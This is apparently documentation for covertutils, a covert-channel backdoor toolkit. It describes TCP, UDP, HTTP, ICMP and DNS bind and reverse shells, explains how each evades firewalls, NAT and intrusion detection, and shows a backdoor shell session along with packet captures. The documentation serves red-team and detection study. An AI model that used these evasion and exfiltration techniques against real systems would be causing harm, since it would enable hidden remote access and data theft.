
.. _programming_examples :

Programming Examples
=====================

Examples can be run using the makefile available in the repo, as shown below:

.. code :: bash

	make EX='examples/example_script.py 8080' run


Notice that examples have to be tested in pairs (agents - handlers).


Simple TCP Bind Shell
---------------------

The Concept
***********

Dead simple shell, just to demonstrate the basic Backdoor structure. Using pure TCP, the data packets are not hidden in any way, they look like an encrypted Layer 7 protocol.


The Setup
**********

*Handler* binds to a TCP port and *Agent* connects to it. Both parties use the TCP connection to push data back and forth.
The data is chunked in 50 byte chunks.

The Code
********

Agent - Server
++++++++++++++

.. literalinclude:: ../examples/tcp_bind_agent.py


Handler - Client
++++++++++++++++

.. literalinclude:: ../examples/tcp_bind_handler.py


.. _rev_tcp :

Simple TCP Reverse Shell
------------------------

The Concept
***********

Same as above, but the *Agent* initializes the connection. Far more useful approach, as it can ignore Firewall/NAT pairs. *Agents* can have NAT'd IP addresses and still be accessible.
Still, looks like a Layer 7 protocol.

The Setup
**********

The TCP Server runs on the *Handler* and awaits the connection in a local or public IP. The *Agent*, knowing the *Handler's* IP (or domain name) connects to it and starts the communication.

The Code
*********

Agent - Client
+++++++++++++++

.. literalinclude:: ../examples/tcp_reverse_agent.py


Handler - Server
++++++++++++++++

.. literalinclude:: ../examples/tcp_reverse_handler.py



Simple UDP Reverse Shell
-------------------------

The Concept
***********

The same as above, but now in UDP. Many administrators ignore UDP protocol and don't include it in the Firewall configuration. But UDP is as usable as TCP...
The ``covertutils`` traffic still looks like an Application Layer protocol, but based on UDP.

The Setup
***********

The *Agent* uses UDP packets to communicate. As a Reverse connection, it is still able to bypass NATs. A UDP server is run on the *Handler*, listening for packets and responding.

The Code
***********

Agent - Client
++++++++++++++

.. literalinclude:: ../examples/udp_reverse_agent.py


Handler - Server
++++++++++++++++

.. literalinclude:: ../examples/udp_reverse_handler.py



Advanced HTTP Reverse Shell
---------------------------

The Concept
***********

Things start to get hairy with this one. All above shells use the ``covertutils`` generated data as an Application Layer protocol. While this won't raise any IDS alerts (as of :ref:`ids_evasion`), it is possible that the packets will be flagged/blocked because of the bogusness of the protocol. That's because some Net admins are smart...

Smart network administrator:

| if it **ain't HTTP/S**,
| and it **ain't DNS**,
| and not **Skype protocol either**,
| then *I don't want it off my network*
|

So, to bypass this kind of Firewall *Whitelisting*, the ``covertutils`` data is designed to resemble random/encrypted data. Also, ``covertutils`` has several tools to embed this kind of data into existing -well known- protocols, effectively creating *Covert Channels*.

Here this technique will be used with HTTP. The URL, Cookie and eTag, in an HTTP request, and an HTML comment in HTTP Response, can be populated with ``covertutils`` data without raising too much suspicion.

The *Agent* polls the *Handler* every few seconds (a random number in the ``delay_between`` space) - feature of the :mod:`covertutils.handlers.interrogating.InterrogatingHandler`, and executes any commands that are returned.

The Setup
*********

For demonstrating purposes, this one is implemented quite badly! Just to provide an example with the (*now deprecated*) :mod:`covertutils.orchestration.stegoorchestrator.StegoOrchestrator`.
The HTTP packets to be send are hardcoded in the *Agent* and *Handler*, with placeholders where data will be injected.

The *Handler* runs a custom TCP server, just to demonstrate the whole ``covertutils`` over HTTP over TCP chain.

The Code
*********

Agent - Client
++++++++++++++

.. literalinclude:: ../examples/http_reverse_agent.py


Handler -Server
+++++++++++++++

.. literalinclude:: ../examples/http_reverse_handler.py



Traffic Sample
**************


**HTTP Request** ::

	GET /search.php?q=01e45e90?userid=6c8a34140ef540caa9acc5221ca3be54bc1425 HTTP/1.1
	Host: {0}
	Cookie: SESSIOID=6626d881415241b388b44b52837465e4ed2b2504f9f16893716c25a1f81e9c5809b5485281acf68327ada9d3c6be170afb3ff5ac8d4de0e77e3dd9eeb089fbe1
	eTag: c9262c8fa9cf36472fc556f39f9446c25c5433


**HTTP Response** ::

	HTTP/1.1 404 Not Found
	Date: Sun, 18 Oct 2012 10:36:20 GMT
	Server: Apache/2.2.14 (Win32)
	Content-Length: 363
	Connection: Closed
	Content-Type: text/html; charset=iso-8859-1

	<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
	<html>
	<head>
	   <title>404 Not Found</title>
	</head>
	<body>
	   <h1>Not Found</h1>
	   <p>The requested URL was not found on this server.</p>
	</body>
	<!-- Reference Code: d90a2b5e614c0b0a28c438e8100f16537f854c5a193
	c0b7da2ca674b2583cf328fe7f7f0cf49e8932ce9dd5f08a362c92f7d923867ffb4b196b885461e12a892
	-->
	</html>


.. note ::
	Please notice that this example will work for only 1 reverse connection. Other connections will jam as of the Cycling Encryption Key.
	A real project would use HTTP Cookies along with :func:`Orchestrator.getIdentity()` and :func:`Orchestrator.checkIdentity()` to achieve session management.




.. _icmp_bind_example:




Advanced ICMP Bind Shell
---------------------------

The Concept
***********

In case you need a Shell from an Internet exposed Web server, or Firewall, or VPS this is for you. Anything with a Public IP will do!
This one monitors ICMP ``echo-request`` packets arriving to the host, and if it identifies ``covertutils`` Layer 7 (after the ICMP header), decodes-executes
and responds with ``echo-reply`` packet containing the reply of the sent command.

It is specifically created to resemble ``ping`` implementation and this can be seen in the :ref:`icmp_traffic_sample` below. Yet, the actual Layer 7 payload contains ``coverutils`` data.


The Setup
***********

The *Agent* monitors all NICs for ICMPs and responds. As it doesn't attempt to connect anywhere, instead waits for data, this is a *Bind* shell (as it *binds* to the NICs).

The *Handler* sends a ping with a command, and a Ping-Pong is initialized until all command output is delivered to the *Handler*. Then silence...

This example uses the Legendary Scapy_ package to parse and create Raw Packets. It can be also implemented using :class:`StegoOrchestrator` class, if Scapy dependency is a bummer.
Windows users will need Npcap_ to use Scapy. Python Raw Sockets do not seem to have this dependency.

As this backdoor uses Raw Sockets, **root** permissions are needed for both *Handler* and **Agent** .

.. _Scapy: http://www.secdev.org/projects/scapy/
.. _Npcap: https://nmap.org/npcap/

The Code
***********

Agent - Server
++++++++++++++

.. literalinclude:: ../examples/icmp_bind_agent.py


Handler - Client
++++++++++++++++

.. literalinclude:: ../examples/icmp_bind_handler.py


.. _icmp_traffic_sample:

Traffic Sample
**************

**Backdoor's Traffic**

.. code:: bash

	make EX='examples/icmp_bind_handler.py 127.0.0.5 pass 0.1' run
	PYTHONPATH=".:" examples/icmp_bind_handler.py 127.0.0.5 pass 0.1
	(covertutils v0.1.1)[control]>
	(covertutils v0.1.1)[control]>
	(covertutils v0.1.1)[control]> !main
	(covertutils v0.1.1)[main]> ls -la
	(covertutils v0.1.1)[main]>
	total 120
	drwxr-xr-x 15 unused unused 4096 Jun 15 06:12 .
	drwxr-xr-x 20 unused unused 4096 Jun 14 23:48 ..
	drwxr-xr-x  3 unused unused 4096 Jun 14 23:13 build
	drwxr-xr-x  3 unused unused 4096 Jun  2 13:42 .cache
	-rw-r--r--  1 unused unused  904 Jun  2 13:42 cov-badge.svg
	-rw-r--r--  1 unused unused 6563 Jun  8 14:10 .coverage
	drwxr-xr-x  9 unused unused 4096 Jun 14 20:44 covertutils
	drwxr-xr-x  2 unused unused 4096 Jun  2 13:42 covertutils.egg-info
	drwxr-xr-x  2 unused unused 4096 Jun  2 13:42 dist
	drwxr-xr-x  4 unused unused 4096 Jun 14 21:15 docs
	drwxr-xr-x  3 unused unused 4096 Jun  2 13:42 .eggs
	drwxr-xr-x  2 unused unused 4096 Jun 15 05:47 examples
	drwxr-xr-x  8 unused unused 4096 Jun 15 06:03 .git
	-rw-r--r--  1 unused unused  129 Jun  2 13:42 .gitignore
	drwxr-xr-x  2 unused unused 4096 Jun  8 14:10 htmlcov
	-rw-r--r--  1 unused unused 1107 Jun  8 12:20 makefile
	-rw-r--r--  1 unused unused 1509 Jun 14 23:13 MANIFEST
	-rw-r--r--  1 unused unused   36 Jun  2 13:42 MANIFEST.in
	-rw-r--r--  1 unused unused  845 Jun  8 14:19 shell_manual_test.py
	drwxr-xr-x  2 unused unused 4096 Jun  8 16:11 __pycache__
	-rw-------  1 unused unused  242 Jun  2 13:42 .pypirc
	-rw-r--r--  1 unused unused 3678 Jun  2 13:42 README.md
	-rw-r--r--  1 unused unused    8 Jun  3 10:40 requirements.txt
	-rw-r--r--  1 unused unused  755 Jun  2 13:42 setup.py
	-rw-r--r--  1 unused unused  865 Jun  3 10:32 setup.pyc
	drwxr-xr-x  3 unused unused 4096 Jun 14 20:42 tests
	drwxr-xr-x  6 unused unused 4096 Jun  2 13:42 .tox
	-rw-r--r--  1 unused unused  385 Jun  2 13:42 tox.ini
	-rw-r--r--  1 unused unused  329 Jun  2 13:42 .travis.yml


	(covertutils v0.1.1)[main]>
	Really Control-C [y/N]? y
	Aborted by the user...



.. code:: bash

	tcpdump -i lo icmp -vv -nn
	tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
	08:31:54.810249 IP (tos 0x0, ttl 64, id 39362, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 5796, seq 1, length 64
	08:31:54.862667 IP (tos 0x0, ttl 64, id 36489, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 5796, seq 1, length 64
	08:31:54.990472 IP (tos 0x0, ttl 64, id 53551, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 5796, seq 2, length 64
	08:31:55.018247 IP (tos 0x0, ttl 64, id 48089, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 5796, seq 2, length 64
	08:31:55.165880 IP (tos 0x0, ttl 64, id 53467, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 5796, seq 3, length 64
	08:31:55.205429 IP (tos 0x0, ttl 64, id 40848, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 5796, seq 3, length 64
	08:31:55.362147 IP (tos 0x0, ttl 64, id 55081, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 5796, seq 4, length 64
	08:31:55.390401 IP (tos 0x0, ttl 64, id 39089, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 5796, seq 4, length 64
	08:31:55.525458 IP (tos 0x0, ttl 64, id 38271, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 5796, seq 5, length 64
	08:31:55.554284 IP (tos 0x0, ttl 64, id 28862, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 5796, seq 5, length 64
	08:31:55.697674 IP (tos 0x0, ttl 64, id 53618, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 5796, seq 6, length 64
	08:31:55.733123 IP (tos 0x0, ttl 64, id 38177, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 5796, seq 6, length 64
	08:31:55.878168 IP (tos 0x0, ttl 64, id 28090, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 5796, seq 7, length 64
	08:31:55.909602 IP (tos 0x0, ttl 64, id 17611, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 5796, seq 7, length 64
	^C
	14 packets captured
	28 packets received by filter
	0 packets dropped by kernel



**Linux Ping Traffic**

.. code:: bash

	ping -c 7 127.0.0.5
	PING 127.0.0.5 (127.0.0.5) 56(84) bytes of data.
	64 bytes from 127.0.0.5: icmp_seq=1 ttl=64 time=0.031 ms
	64 bytes from 127.0.0.5: icmp_seq=2 ttl=64 time=0.047 ms
	64 bytes from 127.0.0.5: icmp_seq=3 ttl=64 time=0.053 ms
	64 bytes from 127.0.0.5: icmp_seq=4 ttl=64 time=0.053 ms
	64 bytes from 127.0.0.5: icmp_seq=5 ttl=64 time=0.050 ms
	64 bytes from 127.0.0.5: icmp_seq=6 ttl=64 time=0.050 ms
	64 bytes from 127.0.0.5: icmp_seq=7 ttl=64 time=0.052 ms

	--- 127.0.0.5 ping statistics ---
	7 packets transmitted, 7 received, 0% packet loss, time 6149ms
	rtt min/avg/max/mdev = 0.031/0.048/0.053/0.007 ms



.. code:: bash

	tcpdump -i lo icmp -vv -nn
	tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
	08:23:43.511965 IP (tos 0x0, ttl 64, id 65001, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 34064, seq 1, length 64
	08:23:43.511975 IP (tos 0x0, ttl 64, id 34349, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 34064, seq 1, length 64
	08:23:44.541260 IP (tos 0x0, ttl 64, id 65026, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 34064, seq 2, length 64
	08:23:44.541273 IP (tos 0x0, ttl 64, id 34539, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 34064, seq 2, length 64
	08:23:45.565248 IP (tos 0x0, ttl 64, id 65215, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 34064, seq 3, length 64
	08:23:45.565262 IP (tos 0x0, ttl 64, id 34742, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 34064, seq 3, length 64
	08:23:46.588884 IP (tos 0x0, ttl 64, id 65448, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 34064, seq 4, length 64
	08:23:46.588898 IP (tos 0x0, ttl 64, id 34956, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 34064, seq 4, length 64
	08:23:47.612154 IP (tos 0x0, ttl 64, id 65491, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 34064, seq 5, length 64
	08:23:47.612167 IP (tos 0x0, ttl 64, id 35125, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 34064, seq 5, length 64
	08:23:48.636315 IP (tos 0x0, ttl 64, id 131, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 34064, seq 6, length 64
	08:23:48.636328 IP (tos 0x0, ttl 64, id 35315, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 34064, seq 6, length 64
	08:23:49.661129 IP (tos 0x0, ttl 64, id 151, offset 0, flags [DF], proto ICMP (1), length 84)
	    127.0.0.1 > 127.0.0.5: ICMP echo request, id 34064, seq 7, length 64
	08:23:49.661142 IP (tos 0x0, ttl 64, id 35362, offset 0, flags [none], proto ICMP (1), length 84)
	    127.0.0.5 > 127.0.0.1: ICMP echo reply, id 34064, seq 7, length 64
	^C
	14 packets captured
	28 packets received by filter
	0 packets dropped by kernel


**It is no copy-paste**

*You can say from the IP identification fields...*


.. _dns_reverse_example:

Agnostic DNS Reverse Shell
---------------------------

The *DNS Reverse Shell* uses a kind of *Communication Channel* that can bypass most *Firewalls/Traffic Inpectors/I[DP]S*.

It uses the main feature of the DNS protocol, delegation, to route its traffic from the *Agent* to the *Handler* - **without a hardcoded IP or Domain Name in the Agent**.

For this Shell to work, there are the following *Handler* (only) requirements:
 * **root** permissions to bind to UDP port 53 (DNS)
 * A Domain name
 * Public IP
 OR

 * A PortForwarded ``53 UDP port`` to a Public IP.

The Agent has no requirements to work.

The Concept
***********
When a host issues a DNS request for a domain name (e.g ``test.www.securosophy.com``), the DNS request packet is send (typically using *UDP*) to the first *Nameserver* registered to the host.
This *Nameserver* tries to resolve the domain name to an IP address, by querying or asking the initial host to query other *Nameservers*.
Every *Nameserver* queried after the initial one will point towards another Nameserver that knows about the specific subdomain asked.

The trick lies on using a subdomain name as *Data*, and make a request that will eventually end up on a *Nameserver* that the user controls (that's the **Handler**)!


The Setup
*********

Handler - Server
++++++++++++++++
Given a purchased domain name (e.g ``example.com``), a subdomain can be created (e.g ``sub.example.com``).
Then, modifying the NS records for ``sub.example.com`` to point to a subdomain like ``ns1.example.com`` will return the *Authoritative Nameserver* for all requests in ``sub.example.com`` (e.g ``test1.sub.example.com``, ``random-whatever.sub.example.com``) to be ``ns1.example.com``.
So, setting the ``A`` (or ``AAAA``) of ``ns1.example.com`` to the *Handler*'s `Public IP` (or *NAT*'d Public IP with PortForward), will route every (non-cached) request to ``sub.example.com`` subdomain to the `Handler`'s IP address.



Agent - Client
++++++++++++++
The *Agent*  uses ``getaddrinfo()`` OS API call to query for subdomains.
Using an OS API call has the advantage that the process does not send a UDP packet itself, hence it uses no socket programming.
The data exfiltration is happening (traditionally) by subdomain names (e.g ``cmFuZG9tIGRhdGEK.sub.example.com``). The queries for those subdomains are always routed to the `Authoritative Nameserver` (as they contain random parts and *cannot be cached*), so the data always reaches the *Handler*.
The *Handler* packs data in IPv6 addresses (16 byte chunks), and responds with a legitimate DNS reply.

The Code
********

Agent - Client
++++++++++++++

.. literalinclude:: ../examples/dns_reverse_agent.py


Handler - Server
++++++++++++++++

.. literalinclude:: ../examples/dns_reverse_handler.py



Traffic Sample
**************

An ``ls -l`` command generated the below traffic sample:

.. code::

	08:57:56.335632 IP localhost.34452 > localhost.domain: 21061+ A? -WG-FGeH5tX2foLCoUsmnG2zLY4w3qCxa5vkNVLZzKDmrPc.sub.securosophy.net. (85)
	08:57:56.335656 IP localhost.34452 > localhost.domain: 47771+ AAAA? -WG-FGeH5tX2foLCoUsmnG2zLY4w3qCxa5vkNVLZzKDmrPc.sub.securosophy.net. (85)
	08:57:56.336439 IP localhost.domain > localhost.34452: 21061* 1/0/0 A 127.0.0.1 (101)
	08:57:56.338222 IP localhost.domain > localhost.34452: 47771* 1/0/0 AAAA 8e97:1e62:7a43:6c52:29a:5b7b:de76:5ad1 (113)
	08:57:56.338582 IP localhost.59587 > localhost.domain: 35582+ A? IZ7s-G-BDvH0w-LAMDGU8b-oQ-B111HmuYOihmg7pSCN7Pk.sub.securosophy.net. (85)
	08:57:56.338605 IP localhost.59587 > localhost.domain: 56935+ AAAA? IZ7s-G-BDvH0w-LAMDGU8b-oQ-B111HmuYOihmg7pSCN7Pk.sub.securosophy.net. (85)
	08:57:56.343726 IP localhost.domain > localhost.59587: 35582* 1/0/0 A 127.0.0.1 (101)
	08:57:56.343830 IP localhost.domain > localhost.59587: 56935* 1/0/0 AAAA b407:3c69:72e2:429e:3ea6:2ee6:31b4:8cc1 (113)
	08:57:56.344491 IP localhost.37893 > localhost.domain: 43966+ A? OelscC7CUHrepHj3JhvI0MkXQ-gY2K6J1VoYFOitM1rgFAE.sub.securosophy.net. (85)
	08:57:56.344663 IP localhost.37893 > localhost.domain: 19997+ AAAA? OelscC7CUHrepHj3JhvI0MkXQ-gY2K6J1VoYFOitM1rgFAE.sub.securosophy.net. (85)
	08:57:56.346375 IP localhost.domain > localhost.37893: 43966* 1/0/0 A 127.0.0.1 (101)
	08:57:56.349638 IP localhost.domain > localhost.37893: 19997* 1/0/0 AAAA dade:6d79:e5dd:43b:dfd:94d:9298:aa2b (113)
